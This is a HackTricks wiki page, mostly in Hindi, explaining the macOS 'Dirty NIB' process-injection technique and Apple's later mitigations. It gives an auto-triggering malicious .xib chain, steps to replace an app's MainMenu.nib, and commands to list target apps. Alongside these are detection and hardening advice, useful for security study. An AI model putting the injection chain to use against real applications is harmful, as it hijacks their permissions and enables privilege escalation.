# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB का मतलब है signed macOS app bundle के अंदर Interface Builder files (.xib/.nib) का दुरुपयोग करके target process के अंदर attacker-controlled logic चलाना, जिससे उसकी entitlements और TCC permissions विरासत में मिलते हैं। यह technique मूल रूप से xpn (MDSec) द्वारा document की गई थी और बाद में Sector7 द्वारा सामान्यीकृत और काफी विस्तृत की गई, जिन्होंने macOS 13 Ventura और macOS 14 Sonoma में Apple की mitigations को भी कवर किया। पृष्ठभूमि और गहरे अध्ययन के लिए, अंत में दिए रेफरेंस देखें।

> TL;DR
> • macOS 13 Ventura से पहले: किसी bundle का MainMenu.nib (या startup पर लोड होने वाला कोई अन्य nib) बदलने से process injection और अक्सर privilege escalation काफी विश्वसनीय तरीके से प्राप्त किया जा सकता था।
> • macOS 13 (Ventura) के बाद और macOS 14 (Sonoma) में और बेहतर: first‑launch deep verification, bundle protection, Launch Constraints, और नया TCC “App Management” permission अनजाने apps द्वारा post‑launch nib tampering को बड़े पैमाने पर रोकते हैं। कुछ विशेष मामलों में अभी भी हमले संभव हो सकते हैं (जैसे same‑developer tooling अपने apps को modify करना, या वो terminals जिन्हें user ने App Management/Full Disk Access दिया हो)।

## NIB/XIB फाइलें क्या हैं

Nib (NeXT Interface Builder का संक्षेप) फाइलें serialized UI object graphs हैं जो AppKit apps द्वारा उपयोग की जाती हैं। आधुनिक Xcode editable XML .xib फाइलें स्टोर करता है जिन्हें build time पर .nib में कंपाइल किया जाता है। एक सामान्य एप अपने main UI को `NSApplicationMain()` के जरिए लोड करता है जो app के Info.plist से `NSMainNibFile` key को पढ़कर runtime पर object graph को instantiate करता है।

Key points that enable the attack:
- NIB loading arbitrary Objective‑C classes को instantiate करता है बिना उन्हें NSSecureCoding के अनुरूप होने की आवश्यकता के (Apple का nib loader जब `initWithCoder:` उपलब्ध नहीं होता तो `init`/`initWithFrame:` पर fallback कर देता है)।
- Cocoa Bindings का दुरुपयोग nibs के instantiate होने पर methods को call करने के लिए किया जा सकता है, जिसमें chained calls शामिल हैं जिन्हें किसी user interaction की आवश्यकता नहीं होती।

## Dirty NIB injection प्रक्रिया (हमलावर का दृष्टिकोण)

पारंपरिक pre‑Ventura प्रवाह:
1) एक malicious .xib बनाएं
- एक `NSAppleScript` object जोड़ें (या अन्य “gadget” classes जैसे `NSTask`)।
- एक `NSTextField` जोड़ें जिसकी title में payload हो (उदा., AppleScript या command arguments)।
- एक या अधिक `NSMenuItem` objects जोड़ें जिन्हें bindings के माध्यम से target object पर methods call करने के लिए wired किया गया हो।

2) बिना user clicks के auto‑trigger करें
- bindings का उपयोग करके मेनू आइटम का target/selector सेट करें और फिर private `_corePerformAction` method invoke करें ताकि action nib के load होते ही स्वचालित रूप से चल जाए। इससे user द्वारा बटन पर क्लिक करने की आवश्यकता हट जाती है।

Minimal example of an auto‑trigger chain inside a .xib (abridged for clarity):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
यह .nib लोड होने पर target process में मनमाना AppleScript निष्पादन हासिल करता है। Advanced chains निम्न कर सकती हैं:
- मनमाने AppKit क्लासेस instantiate कर सकते हैं (e.g., `NSTask`) और `-launch` जैसे zero‑argument methods कॉल कर सकते हैं।
- ऊपर बताये binding trick के जरिए object arguments वाले arbitrary selectors को कॉल कर सकते हैं।
- AppleScriptObjC.framework लोड करके Objective‑C में ब्रिज कर सकते हैं और चुने हुए C APIs को भी कॉल कर सकते हैं।
- उन पुराने सिस्टम्स पर जिनमें अभी भी Python.framework शामिल है, Python में ब्रिज करके `ctypes` का उपयोग कर arbitrary C functions को कॉल कर सकते हैं (Sector7’s research).

3) Replace the app’s nib
- target.app को एक writable location पर copy करें, उदाहरण के लिए `Contents/Resources/MainMenu.nib` को malicious nib से replace करें, और target.app चलाएँ। Pre‑Ventura, एक one‑time Gatekeeper assessment के बाद, subsequent लॉन्च केवल shallow signature checks करते थे, इसलिए non‑executable resources (जैसे .nib) को फिर से re‑validated नहीं किया जाता था।

Example AppleScript payload for a visible test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## आधुनिक macOS सुरक्षा (Ventura/Monterey/Sonoma/Sequoia)

Apple ने कई प्रणालीगत रोधक उपाय पेश किए हैं जो आधुनिक macOS में Dirty NIB की प्रभावशीलता को नाटकीय रूप से कम कर देते हैं:
- First‑launch deep verification and bundle protection (macOS 13 Ventura)
- किसी भी ऐप के पहले रन पर (quarantined या नहीं), एक गहरा सिग्नेचर चेक सभी बंडल संसाधनों को कवर करता है। इसके बाद, बंडल संरक्षित हो जाता है: केवल उसी developer के apps (या ऐप द्वारा स्पष्ट रूप से अनुमत) इसके सामग्री में संशोधन कर सकते हैं। अन्य apps को किसी अन्य ऐप के बंडल में लिखने के लिए नए TCC “App Management” permission की आवश्यकता होती है।
- Launch Constraints (macOS 13 Ventura)
- System/Apple‑bundled apps को कहीं और कॉपी करके लॉन्च नहीं किया जा सकता; इससे OS apps के लिए “copy to /tmp, patch, run” दृष्टिकोण खत्म हो जाता है।
- Improvements in macOS 14 Sonoma
- Apple ने App Management को सख्त किया और Sector7 द्वारा नोट किए गए ज्ञात bypasses (e.g., CVE‑2023‑40450) को ठीक किया। Python.framework पहले ही हटाया जा चुका था (macOS 12.3), जिससे कुछ privilege‑escalation chains टूट गए।
- Gatekeeper/Quarantine changes
- Gatekeeper, provenance, और assessment में उन परिवर्तनों पर व्यापक चर्चा के लिए जिनका इस technique पर प्रभाव पड़ा, नीचे संदर्भित पृष्ठ देखें।

> व्यावहारिक निहितार्थ
> • Ventura+ पर आप सामान्यतः किसी third‑party app के .nib को modify नहीं कर सकते जब तक कि आपकी process के पास App Management न हो या target के समान Team ID से signed न हो (उदा., developer tooling)।
> • shells/terminals को App Management या Full Disk Access देना प्रभावी रूप से उस attack surface को फिर से खोल देता है उन किसी भी चीज़ के लिए जो उस terminal के context में कोड execute कर सकती है।


### Launch Constraints को संबोधित करना

Launch Constraints Ventura से शुरू होकर कई Apple apps को non‑default लोकेशनों से चलाने से रोकते हैं। यदि आप pre‑Ventura वर्कफ़्लोज़ पर निर्भर थे, जैसे कि किसी Apple app को temp directory में कॉपी करना, `MainMenu.nib` में संशोधन करना, और उसे लॉन्च करना, तो उम्मीद करें कि यह >= 13.0 पर फेल होगा।


## लक्ष्यों और nibs की सूची बनाना (अनुसंधान / legacy systems के लिए उपयोगी)

- उन apps को ढूंढें जिनका UI nib‑driven है:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- बंडल के अंदर संभावित nib संसाधनों को खोजें:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Validate code signatures deeply (यदि आप resources के साथ छेड़छाड़ कर चुके हैं और didn’t re‑sign तो यह विफल होगा):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> नोट: आधुनिक macOS पर बिना उचित अधिकरण के किसी अन्य ऐप के बंडल में लिखने का प्रयास करते समय आपको बंडल सुरक्षा/TCC द्वारा भी रोका जाएगा।


## Detection and DFIR tips

- बंडल संसाधनों पर फ़ाइल अखंडता की निगरानी
- इंस्टॉल किए गए ऐप्स में `Contents/Resources/*.nib` और अन्य गैर‑निष्पादन योग्य संसाधनों के mtime/ctime बदलावों पर नजर रखें।
- Unified logs और प्रक्रिया व्यवहार
- GUI ऐप्स के अंदर अनपेक्षित AppleScript निष्पादन और उन प्रक्रियाओं पर निगरानी रखें जो AppleScriptObjC या Python.framework लोड कर रही हैं। उदाहरण:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- प्रोएक्टिव आकलन
- नियत अंतराल पर महत्वपूर्ण ऐप्स में संसाधनों की अखंडता सुनिश्चित करने के लिए `codesign --verify --deep` चलाएँ।
- Privilege context
- Audit करें कि किसके/क्या के पास TCC “App Management” या Full Disk Access है (खासकर terminals और management agents)। इन्हें सामान्य‑उद्देश्य शेल्स से हटाने से आसानी से Dirty NIB‑style छेड़छाड़ को फिर से सक्षम होने से रोका जा सकता है।


## Defensive hardening (developers and defenders)

- निब्स से instantiated होने वाली चीज़ों को सीमित करें या प्रोग्रामैटिक UI को प्राथमिकता दें। nib ग्राफ में शक्तिशाली क्लासेस (जैसे `NSTask`) शामिल करने से बचें और ऐसे bindings से भी बचें जो किसी arbitrary ऑब्जेक्ट पर selectors को अप्रत्यक्ष रूप से invoke करते हैं।
- Library Validation के साथ hardened runtime अपनाएँ (आधुनिक ऐप्स के लिए पहले से ही मानक)। हालांकि इससे स्वयमेव nib injection रुकता नहीं है, यह आसान native code loading को ब्लॉक करता है और हमलावरों को केवल scripting‑only payloads पर मजबूर कर देता है।
- सामान्य‑उद्देश्य के टूल्स में व्यापक App Management permissions के लिए अनुरोध न करें और उन पर निर्भर न रहें। यदि MDM को App Management की आवश्यकता है, तो उस संदर्भ को user‑driven shells से अलग रखें।
- नियमित रूप से अपने ऐप बंडल की अखंडता की जाँच करें और अपने अपडेट मैकेनिज्म को बंडल संसाधनों को self‑heal करने योग्य बनाएँ।


## Related reading in HackTricks

इस तकनीक को प्रभावित करने वाले Gatekeeper, quarantine और provenance परिवर्तनों के बारे में और जानें:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- xpn – DirtyNIB (मूल write‑up Pages उदाहरण के साथ): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
